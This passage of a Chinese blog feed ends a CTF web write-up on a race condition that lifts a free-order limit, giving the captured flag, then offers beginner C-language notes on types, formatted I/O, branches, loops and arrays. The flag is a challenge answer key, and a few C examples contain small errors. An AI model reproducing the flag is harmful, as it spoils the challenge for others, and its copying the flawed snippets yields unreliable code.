              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_%E8%B6%85%E7%BA%A7%E9%A6%99%E9%94%853.png" alt="Web_超级香锅3"></p>
            </div>

<p>再访问 <code>/checkout</code> 查看自己点的菜，flag就出现了。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_%E8%B6%85%E7%BA%A7%E9%A6%99%E9%94%854.png" alt="Web_超级香锅4"></p>
            </div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;naivekun_wAnna_@_girlfr1end_2147483647&#125;</span><br></pre></td></tr></table></figure>

<h4 id="题目总结-4"><a href="#题目总结-4" class="headerlink" title="题目总结"></a>题目总结</h4><ul>
<li>多线程编程，模型复杂，容易发生冲突，必须用锁加以隔离。如果不隔离，就可以突破“白嫖”上限，造成数据错误。</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>AST Task1</title>
    <url>/2019/10/05/AST-Task1/</url>
    <content><![CDATA[<p>在EIC-AST的第一个Task~</p>
<a id="more"></a>

<h1 id="学习内容"><a href="#学习内容" class="headerlink" title="学习内容"></a>学习内容</h1><h2 id="0x01-C-语言中的数据类型"><a href="#0x01-C-语言中的数据类型" class="headerlink" title="0x01 C 语言中的数据类型"></a>0x01 C 语言中的数据类型</h2><h3 id="C-语言中的常用数据类型"><a href="#C-语言中的常用数据类型" class="headerlink" title="C 语言中的常用数据类型"></a>C 语言中的常用数据类型</h3><hr>
<p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/C%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.png%22C%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%22" alt="C语言中的常用数据类型"></p>
<hr>
<h4 id="C-语言中整型与字符型数据"><a href="#C-语言中整型与字符型数据" class="headerlink" title="C 语言中整型与字符型数据"></a>C 语言中整型与字符型数据</h4><p>首先需要注意的是：</p>
<p>无符号(unsigned)整型数据与一般有符号整型数据的区别。</p>
<p>整型有无符号（unsigned）和有符号（signed）两种类型，在默认情况下声明的整型变量都是有符号的类型（char 有点特别，需要根据具体编译环境确定），如果需声明无符号类型的话就需要在类型前加上 unsigned。</p>
<p>无符号整型和有符号整型的区别就是无符号类型可以存放的正数范围比有符号整型中的范围大一倍，因为有符号类型将最高位储存符号，而无符号类型全都储存数字。</p>
<p>并且：</p>
<p>在 C/C++语言中，int 和 long int 的所占的字节数与编译环境有关。</p>
<p>C 语言标准是这样规定的：int 最少 16 位（2 字节），long 不能比 int 短，short 不能比 int 长，具体位长由编译器开发商根据各种情况自己决定。</p>
<p>在老式的 16 位编译系统上，short、int、long 普遍的长度是 2 字节、2 字节、4 字节。<br>在 32 位编译系统 x86 处理器上，short、int、long 普遍的长度是 2 字节、4 字节、4 字节。int 占四字节，与 long 相同。<br>在 64 位编译系统 x64 处理器上：short 占两字节，int 占四字节，long 占 8 字节，long 数据范围变为：-2^63~2^63-1</p>
<p>由此可见 int 类型的数据长度一般是机器位长。在 16 位编译系统中 int 为 16 位，两个字节；32 位编译系统中 int 为 32 位，4 个字节；但是在 64 位编译系统中为了兼容 32 位编译系统，64 位编译系统的 int 也是 4 字节。</p>
<p>现在常用的编译器多认为 int 和 long int 相同，均为 4 字节，short 为 2 字节，char 为 1 字节。<br>如果只输入 int，它有可能是以上三种形式中的一种。</p>
<p>那么如何得到某个类型在特定平台上的准确大小？</p>
<p>为了得到某个类型或某个变量在特定平台上的准确大小，我们可以使用 sizeof 运算符。通过表达式 sizeof(type) 得到对象或类型的存储字节大小。下面的实例演示了获取 int 类型的大小：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"int 存储大小 : %lu \n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="C-语言中的-void-类型"><a href="#C-语言中的-void-类型" class="headerlink" title="C 语言中的 void 类型"></a>C 语言中的 void 类型</h4><p>void 类型指定没有可用的值。它通常用于以下三种情况下：</p>
<p>第一种：函数返回为空<br>C 中有各种函数都不返回值，或者您可以说它们返回空。不返回值的函数的返回类型为空。例如 void exit (int status);</p>
<p>第二种：函数参数为空<br>C 中有各种函数不接受任何参数。不带参数的函数可以接受一个 void。例如 int rand(void);</p>
<p>3 指针指向 void<br>类型为 void * 的指针代表对象的地址，而不是类型。例如，内存分配函数<br><code>void *malloc( size_t size );</code><br>返回指向 void 的指针，可以转换为任何数据类型。</p>
<h4 id="C-语言中的-bool（布尔）类型"><a href="#C-语言中的-bool（布尔）类型" class="headerlink" title="C 语言中的 bool（布尔）类型"></a>C 语言中的 bool（布尔）类型</h4><p>在此之前的 C 语言中，使用整型 int 来表示真假。在输入时：使用非零值表示真；零值表示假。在输出时：真的值是 1，假的值是 0。</p>
<p>现在，出现了布尔型变量。<code>_Bool</code>类型长度为 1，只能取值范围为 0 或 1。将任意非零值赋值给<code>_Bool</code>类型，都会先转换为 1，表示真。将零值赋值给<code>_Bool</code>类型，结果为 0，表示假。</p>
<p>有如下 example program：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">    int main()&#123;</span><br><span class="line">      _Bool bool1 &#x3D; 1;</span><br><span class="line">      _Bool bool2 &#x3D; 2;    &#x2F;* 非零值，bool2的值为1 *&#x2F;</span><br><span class="line">      _Bool bool3 &#x3D; 0;</span><br><span class="line">      _Bool bool4 &#x3D; -1;   &#x2F;* 非零值，bool4的值为1 *&#x2F;</span><br><span class="line"></span><br><span class="line">      printf(&quot;bool1&#x3D;&#x3D;%d,  \n&quot;, bool1);</span><br><span class="line">      printf(&quot;bool2&#x3D;&#x3D;%d,  \n&quot;, bool2);</span><br><span class="line">      printf(&quot;bool3&#x3D;&#x3D;%d,  \n&quot;, bool3);</span><br><span class="line">      printf(&quot;bool4&#x3D;&#x3D;%d,  \n&quot;, bool4);</span><br><span class="line"></span><br><span class="line">      printf(&quot;sizeof(_Bool) &#x3D;&#x3D; %d  \n&quot;, sizeof(_Bool));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：<br><code>bool1==1, bool2==1, bool3==0, bool4==1, sizeof(_Bool) == 1</code></p>
<h4 id="C-语言中的数组类型"><a href="#C-语言中的数组类型" class="headerlink" title="C 语言中的数组类型"></a>C 语言中的数组类型</h4><p>所有的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。<br><img src="https://www.runoob.com/wp-content/uploads/2014/08/arrays.jpg%22%E6%95%B0%E7%BB%84%E7%BB%93%E6%9E%84%E7%A4%BA%E4%BE%8B%22" alt="数组结构示例"></p>
<h4 id="C-语言中的指针类型"><a href="#C-语言中的指针类型" class="headerlink" title="C 语言中的指针类型"></a>C 语言中的指针类型</h4><p>每个变量都被存放在从某个内存地址（以字节为单位）开始的若干个字节中。“指针”，也称作“指针变量”，大小为 4 个字节（或 8 个字节）的变量，其内容代表一个内存地址。<br>通过指针，我们能够对该指针指向的内存区域进行读写。<br>如果把内存的每个字节都想像成宾馆的一个房间，那么内存地址相当于就是房间号，而指针里存放的，就是房间号。</p>
<p>T _ p ; // T 可以是任何类型的名字，比如 int, double ,char 等等。<br>p 的类型: T _</p>
<ul>
<li>p 的类型： T<br>通过表达式 * p，可以读写从地址 p 开始的 sizeof(T)个字节</li>
<li><em>p</em> 等价于存放在地址 p 处的一个 T 类型的变量</li>
<li>意思为间接引用运算符<br>sizeof(T*) 4 字节（64 位计算机上可能 8 字节）</li>
</ul>
<p>有了指针，就有了自由访问内存空间的手段：<br>不需要通过变量，就能对内存直接进行操作。通过指针，程序能访问的内存区域就不仅限于变量所占据的数据区域。<br>在 C 中，用指针 p 指向 a 的地址,然后对 p 进行加减操作，p 就能指向 a 后面或前面的内存区域，通过 p 也就能访问这些内存区域。</p>
<h4 id="C-语言中的字符串类型"><a href="#C-语言中的字符串类型" class="headerlink" title="C 语言中的字符串类型"></a>C 语言中的字符串类型</h4><p>C 语言中，字符串有两种形式：</p>
<ol>
<li>用双引号括起来的字符串常量， 如”CHINA” ， “C program “。</li>
<li>存放于字符数组中，以‘\0’字符（ASCII 码为 0)结尾</li>
</ol>
<p>存放于字符数组中的字符串常量占据内存的字节数等于字符串中字符数目加 1，多出来的是结尾字符‘\0’。<br>但是字符串的长度不包含’\0’<br>用 char 数组存放字符串，数组元素个数应该至少为字符串长度+1，以避免数组越界。<br>char 数组的内容，可以在初始化时设定，还可以用对数组元素赋值的办法任意改变其中的某个字符。</p>
<p>“” 也是合法的字符串常量，称为“空串”， 空串仍然会占据一个字节的存储空间，存放 ‘\0’。</p>
<p>如果字符串常量中包含双引号，则双引号应写为‘&quot;’。而‘\’字符在 字符串中出现时，须连写两次，变成‘\’，以防止转译。</p>
<h4 id="C-语言中的结构类型"><a href="#C-语言中的结构类型" class="headerlink" title="C 语言中的结构类型"></a>C 语言中的结构类型</h4><p>两个同类型的结构变量，可以互相赋值。但是结构变量之间不能用“==”、“!=”、“&lt;”、“&gt;”、“&lt;=”、“&gt;=”进行比较运算。</p>
<p>一般来说，一个结构变量所占的内存空间的大小，就是结构中所有成员变量大小之和。结构变量中的各个成员变量在内存中一般是连续存放的。</p>
<p>并且，一个结构的成员变量可以是任何类型的，包括可以是另一个结构类型:</p>
<h3 id="ASCII-码和-char-类型的关系"><a href="#ASCII-码和-char-类型的关系" class="headerlink" title="ASCII 码和 char 类型的关系"></a>ASCII 码和 char 类型的关系</h3><p>char 表示一个字符型数据，其和 int 在 0-255 范围内是等价的。而字符编码采用的是 ASCII 码，所以看起来和 ASCII 有关。在用 char 进行输入、输出时其值可以被当成 ASCII 码，输入、输出函数根据这个码找到相应的字符输入或输出。</p>
<h2 id="0x02-使用格式化输入输出函数-printf-和-scanf"><a href="#0x02-使用格式化输入输出函数-printf-和-scanf" class="headerlink" title="0x02 使用格式化输入输出函数 printf()和 scanf()"></a>0x02 使用格式化输入输出函数 printf()和 scanf()</h2><p>在 printf 和 scanf 中可以使用以”%”开头的控制符，指明要输入或输出的数据的类型以及格式。<br>常用的格式控制符如下表所示：<br>|常用格式控制符|作 用|<br>|—|—|<br>|%d|读入或输出 int 变量|<br>|%c|读入或输出 char 变量|<br>|%f|读入或输出 float 变量，输出时保留小数点后面 6 位|<br>|%lf|读入或输出 double 变量，输出时保留小数点后面 6 位|<br>|%x|以十六进制读入或输出整型变量|<br>|%lld|读入或输出 long long 变量(64 位整数）|<br>|%nd|(如%4d,%12d）以 n 字符宽度输出整数，宽度不足时用空格填充|<br>|%0nd|( 如 %04d,%012d )以 n 字符宽度输出整数，宽度不足时用 0 填充|<br>|%.nf|(如%.4f,%.3f） 输出 double 或 float 值，精确到小数点后 n 位|</p>
<h3 id="scanf-的进阶使用"><a href="#scanf-的进阶使用" class="headerlink" title="scanf 的进阶使用"></a>scanf 的进阶使用</h3><p>1.用 scanf 可以一次读入多个类型不同的变量，只要输入的各项之间用空格分隔即可。<br>example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n; <span class="keyword">char</span> c; <span class="keyword">float</span> m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%c%f"</span>,&amp;n,&amp;c,&amp;m);</span><br><span class="line">    <span class="comment">/*依次输入一个整数，一个字符，再一个整数，则它们会被分别放入n,c,m；&amp;n代表“取n的地址"，%c代表等待输入一个字符*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %c %f"</span>,n,c,m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>输入：34 k 234.45↙<br>输出：34 k 234.449997</p>
</blockquote>
<p>2.若输入的各项之间没有用空格分隔，则等待输入字符时，不会跳过空格(空格也会被当作字符读入)，输入其他类型的数据时，会跳过空格。<br>example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n; <span class="keyword">char</span> c; <span class="keyword">float</span> f;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%c%f"</span>,&amp;n,&amp;c,&amp;f);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %c %f"</span>,n,c,f);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>输入：34 k 456↙<br>输出：34 0.000000</p>
</blockquote>
<pre><code>原因：c = &apos; &apos;, 读入f 时，对应输入是&apos;k&apos;，导致出错。</code></pre><p>3.如果在输入中有 scanf 中出现的非控制字符，则这些字符会被跳过。<br>example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m; <span class="keyword">char</span> c; <span class="keyword">float</span> f;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %c,%f:%d"</span>,&amp;n,&amp;c,&amp;f,&amp;m);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d,%c,%f,%d"</span>,n,c,f,m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>输入：12 k,3.75:290↙<br>输出：12,k,3.750000,290</p>
</blockquote>
<h3 id="有关-sprintf-和-sscanf-函数"><a href="#有关-sprintf-和-sscanf-函数" class="headerlink" title="有关 sprintf()和 sscanf()函数"></a>有关 sprintf()和 sscanf()函数</h3><p>参考这篇文章:<a href="https://www.cnblogs.com/jikebiancheng/p/6285525.html" target="_blank" rel="noopener">浅析 C 语言中 printf(),sprintf(),scanf(),sscanf()的用法和区别-极客编程-博客园</a></p>
<h2 id="0x03-分支结构与循环控制结构"><a href="#0x03-分支结构与循环控制结构" class="headerlink" title="0x03 分支结构与循环控制结构"></a>0x03 分支结构与循环控制结构</h2><h3 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h3><h4 id="if-语句常见错误"><a href="#if-语句常见错误" class="headerlink" title="if 语句常见错误"></a>if 语句常见错误</h4><p>1.错把赋值符当逻辑运算符来使用：<br>example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( a = <span class="number">0</span> ) <span class="comment">//a = 0的值是0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello"</span>);</span><br><span class="line"><span class="keyword">if</span>( a = <span class="number">5</span> ) <span class="comment">// a = 5的值是5</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Hi"</span>);</span><br><span class="line"></span><br><span class="line">=&gt; Hi</span><br></pre></td></tr></table></figure>

<p>2.互相矛盾的多个条件，如果确实只希望执行其中一个分支，应该用 if 和多个 else if，而不要写多个 if</p>
<p>wrong example:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( a &gt;=<span class="number">0</span> &amp;&amp; a &lt; <span class="number">5</span> )</span><br><span class="line">a = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span>( a &gt;= <span class="number">5</span> &amp;&amp; a &lt; <span class="number">10</span> )</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello"</span>);</span><br><span class="line"><span class="keyword">if</span>( a &gt; <span class="number">10</span> &amp;&amp; a &lt; <span class="number">20</span>)</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">if</span>( a &gt;= <span class="number">20</span>)</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p>最终会输出 hello</p>
<p>right example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( a &gt;=<span class="number">0</span> &amp;&amp; a &lt; <span class="number">5</span> )</span><br><span class="line">a = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>( a &gt;= <span class="number">5</span> &amp;&amp; a &lt; <span class="number">10</span> )</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>( a &gt; <span class="number">10</span> &amp;&amp; a &lt; <span class="number">20</span>)</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p>不会输出 hello</p>
<h4 id="switch-语句常见错误"><a href="#switch-语句常见错误" class="headerlink" title="switch 语句常见错误"></a>switch 语句常见错误</h4><p>switch 语句在进入某个 case 分支后，会一直执行到第一个碰到的“break;”，即使这个“break;”是在后面的 case 分支里面。如果没有碰到“break;”，则会向下一直执行到 switch 语句末尾的“}”，包括“default:”部分的语句组也会被执行。</p>
<p>因此，在运用 switch 语句时，一定要根据题目加上 break 关键字。</p>
<h4 id="if-else-与-switch-case-语法的区别"><a href="#if-else-与-switch-case-语法的区别" class="headerlink" title="if-else 与 switch-case 语法的区别"></a>if-else 与 switch-case 语法的区别</h4><p>if 语句，if else if 语句和 switch case 语句都属于流程控制语句。</p>
<p>在只需要判断一个条件的时候，自然是使用 if 语句方便有效；但是当判断条件很多的时候，我们可以使用多个 if 语句或者 if…else if 语句或者 switch case 语句。</p>
<p>if…else if 语句和多个 if 语句的区别还是很大的，if…else if 在任何一个环节满足条件的时候就将会终止判断，只处理一个满足条件的情况；而对于多个 if 语句，将会对每一个判断条件进行判断，自然而然会导致程序的执行效率降低。在多个判断条件的情况下，使用 if…else if 语句相对于使用多个 if 语句而言，可以减少程序的判断次数，提高效率。</p>
<p>在多个判断条件的情况下，不仅可以使用 if…else if 语句，还可以使用 switch case 语句。一般情况下，当判断条件较多的情况下，使用 switch case 语句的效率会高于使用 if…else if 语句。switch…case 与 if…else if 的根本区别在于，switch…case 会生成一个跳转表来指示实际的 case 分支的地址，而这个跳转表的索引号与 switch 变量的值是相等的。从而，switch…case 不用像 if…else if 那样遍历条件分支直到命中条件，而只需访问对应索引号的表项从而到达定位分支的目的。</p>
<p>因此，当只有分支比较少的时候，if 效率比 switch 高（因为 switch 需要生成跳转表）。若分支比较多，那当然是 switch 更高效也更清晰。</p>
<h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><h4 id="for-循环语句结构特点"><a href="#for-循环语句结构特点" class="headerlink" title="for 循环语句结构特点"></a>for 循环语句结构特点</h4><p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/for.png" alt="for语句结构"><br>for 语句结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>( 表达式<span class="number">1</span> ;表达式<span class="number">2</span>;表达式<span class="number">3</span>) &#123;</span><br><span class="line">语句组</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>for 循环结构里的“表达式 1”和“表达式 3”都可以是用逗号连接的若干个表达式。</em></p>
<h4 id="for-循环括号内三个语句的执行时间"><a href="#for-循环括号内三个语句的执行时间" class="headerlink" title="for 循环括号内三个语句的执行时间"></a>for 循环括号内三个语句的执行时间</h4><p>执行过程：</p>
<ol>
<li>计算“表达式 1”。</li>
<li>计算“表达式 2”，若其值为 true，则执行“{ }”中的语句组，然后转到 3)；若为 false,则不再执行“{}”中的语句组，for 语句结束，转到 5)。</li>
<li>计算“表达式 3”。</li>
<li>转到 2)。</li>
<li>从 for 语句后面继续往下执行程序。</li>
</ol>
<h4 id="for-语句的循环控制变量特点"><a href="#for-语句的循环控制变量特点" class="headerlink" title="for 语句的循环控制变量特点"></a>for 语句的循环控制变量特点</h4><p>循环控制变量定义在”表达式 1”中，则其只在 for 语句内部起作用，可以不用担心循环控制变量重名。<br>example：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">26</span>; ++i )&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%c\n"</span>,<span class="keyword">char</span>(<span class="string">'a'</span>+i ));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">26</span>; i+=<span class="number">2</span> )&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%c\n"</span>,<span class="keyword">char</span>(<span class="string">'a'</span>+i ));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i）;<span class="comment">//此处的i和for里面的i无关</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;最后的一个输出：<span class="number">5</span></span><br><span class="line"></span><br><span class="line">#### <span class="keyword">while</span>循环语句结构特点</span><br><span class="line">```c</span><br><span class="line"><span class="keyword">while</span>(表达式) &#123;</span><br><span class="line">语句组</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若情境是并非到达指定次数，而是满足某条件时即停止循环，则适合用 while 语句来实现循环。</p>
<h4 id="while-循环的执行过程"><a href="#while-循环的执行过程" class="headerlink" title="while 循环的执行过程"></a>while 循环的执行过程</h4><ol>
<li>判断“表达式”是否为真，如果不为真，则转 4)</li>
<li>执行“语句组”</li>
<li>转 1)</li>
<li>while 语句结束，继续执行 while 语句后面的语句。</li>
</ol>
<h4 id="do……while-循环语句结构特点"><a href="#do……while-循环语句结构特点" class="headerlink" title="do……while 循环语句结构特点"></a>do……while 循环语句结构特点</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">语句组</span><br><span class="line">&#125; <span class="keyword">while</span>(表达式);</span><br></pre></td></tr></table></figure>

<p>如果希望循环至少要执行一次，就可以使用 do…while 语句。</p>
<h4 id="do……while-循环语句的执行过程"><a href="#do……while-循环语句的执行过程" class="headerlink" title="do……while 循环语句的执行过程"></a>do……while 循环语句的执行过程</h4><p>每执行一次循环后，都要判断“表达式”的值是否为真，如果真就继续循环，如果为假，就停止循环。</p>
<h4 id="while-和-do……while-语句的区别"><a href="#while-和-do……while-语句的区别" class="headerlink" title="while 和 do……while 语句的区别"></a>while 和 do……while 语句的区别</h4><p>while 先判断后执行，do while 先执行后判断<br>当不满足循环条件时，while 循环一次都不会执行，do while 循环至少执行一次</p>
<h4 id="break-与-continue-语句"><a href="#break-与-continue-语句" class="headerlink" title="break 与 continue 语句"></a>break 与 continue 语句</h4><p>break 语句可以出现在循环体中(for、while、do…while 循环均可)，其作用是跳出循环。<br>并且在多重循环的情况下，break 语句只能跳出直接包含它的那一重循环。</p>
<p>example:<br>_找兄弟数_：如果两个不同的正整数，他们的和是他们的积的因子，就称这两个数为兄弟数，小的称为弟数，大的称为兄数。先后输入正整数 n 和 m(n &lt; m) , 请在 n 至 m 这 m-n+1 个数中，找出一对兄弟数。如果找不到，就输出“No Solution.”。如果能找到，就找出和最小的那一对；如果有多对兄弟数和相同且都是最小，就找出弟数最小的那一对。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m );</span><br><span class="line">    <span class="keyword">int</span> a = m + <span class="number">1</span>,b = m + <span class="number">1</span>; <span class="comment">//a,b记录已经找到的最佳兄弟数，a是弟数，b是兄数</span></span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">int</span> i = n; i &lt; m ; ++i ) &#123;  <span class="comment">//取弟数，共m-n种取法</span></span><br><span class="line">      <span class="keyword">if</span>( i &gt; (a + b)/<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">      <span class="keyword">break</span>; <span class="comment">// 跳出外重循环</span></span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= m; ++j ) &#123; <span class="comment">//取兄数</span></span><br><span class="line">          <span class="keyword">if</span>( i + j &gt; a + b ) <span class="keyword">break</span>; <span class="comment">// 跳出内重循环</span></span><br><span class="line">          <span class="keyword">if</span>( i * j % (i + j) == <span class="number">0</span> ) &#123; <span class="comment">//发现兄弟数</span></span><br><span class="line">            <span class="keyword">if</span>( i + j &lt; a + b) &#123; <span class="comment">//发现和更小的兄弟数</span></span><br><span class="line">              a = i; b = j ; <span class="comment">//更新已找到的最佳兄弟数</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>( i + j == a + b &amp;&amp; i &lt; a)</span><br><span class="line">              <span class="comment">//发现和相同但弟数更小的兄弟数</span></span><br><span class="line">              a = i; b = j; <span class="comment">//更新已找到的最佳兄弟数</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span>( a == m + <span class="number">1</span> ) <span class="comment">//没找到兄弟数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No solution."</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d,%d\n"</span>,a,b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>continue 语句可以出现在循环体中(for、while、do…while 循环均可)，其作用是立即结束本次循环，并回到循环开头判断是否要进行下一次循环。<br>在多重循环的情况下，continue 只对直接包含它的那重循环起作用。</p>
<p>example：<br><em>找 10 以内的偶数</em></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">10</span> ;++i ) &#123;</span><br><span class="line">    <span class="keyword">if</span>( i % <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">continue</span>; <span class="comment">//导致不执行后面的语句，回到循环开头</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d,"</span>,i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>输出：2,4,6,8,10,</p>
</blockquote>
<h2 id="0x04-初始化数组"><a href="#0x04-初始化数组" class="headerlink" title="0x04 初始化数组"></a>0x04 初始化数组</h2><h3 id="一维数字数组的初始化"><a href="#一维数字数组的初始化" class="headerlink" title="一维数字数组的初始化"></a>一维数字数组的初始化</h3><p>在通过<code>type arrayName [ arraySize ];</code>语句声明数组之后，需要对数组进行初始化。</p>
<p>在 C 中，我们可以逐个初始化数组，也可以使用一个初始化语句，如下所示：<br><code>int test[5] = {1, 2, 3, 4, 5};</code></p>
<p>需要注意的是，声明数组时方括号内的数字代表的是数组长度。数组的元素都是从 0 开始标号的，因此数组的第一个元素是 arrayName[0],最后一个元素是 arrayName[数组的总大小减去 1]。需要牢记这一点以免发生数组越界情况。</p>
<p>例如，有以下程序：</p>
